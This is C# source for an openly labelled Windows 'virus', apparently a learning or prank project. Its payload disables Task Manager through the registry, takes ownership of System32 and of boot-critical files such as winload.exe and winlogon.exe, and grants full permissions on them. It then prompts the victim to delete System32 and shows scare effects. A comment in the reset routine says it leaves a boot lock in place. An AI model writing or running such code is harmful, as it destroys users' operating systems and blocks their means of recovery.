using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace LearnVirus.Virus
{
    public class Virus
    {
        public static void RunPayloads()
        {
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager

            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && title Æ:\\Windows\System32\cmd.exe && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && takeown /f C:\Windows\System32\winload.exe && icacls C:\Windows\System32\winload.exe /grant %username%:F && takeown /f C:\Windows\System32\winlogon.exe && icacls C:\Windows\System32\winlogon.exe /grant %username%:F && takeown /f C:\Windows\System32\ci.dll && icacls C:\Windows\System32\ci.dll /grant %username%:F && cd C:/Windows/System32 && cls && echo Oh, could you please help me write 'rmdir C:/Windows/System32'?") }.Start();

            Process.EnterDebugMode();
            TaskbarEffect.Hide();
            Thread.Sleep(1000);
            Console.WriteLine("There is no return!");
            Thread.Sleep(500);
            CMD.RunCommand("Color 4F");
            Music.PlayMusic();
            NotepadText.ShowNotepad();
            TaskbarEffect.Flash();
            CMD.RunCMD();
        }

        public static void Reset() //Revert all actions except for boot lock
        {
            TaskbarEffect.Reset();
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            try
            {
                rk.DeleteValue("DisableTaskMgr"); // turn on task manager
            } catch { }
            try
            {
                File.Delete(@"c:\Windows\System32\bad.wav"); //Delete music file
            }
            catch { }
            try
            {
                File.Delete(@"C:/Windows/System32/README"); //Delete text file
            }
            catch { }
        }
    }
}
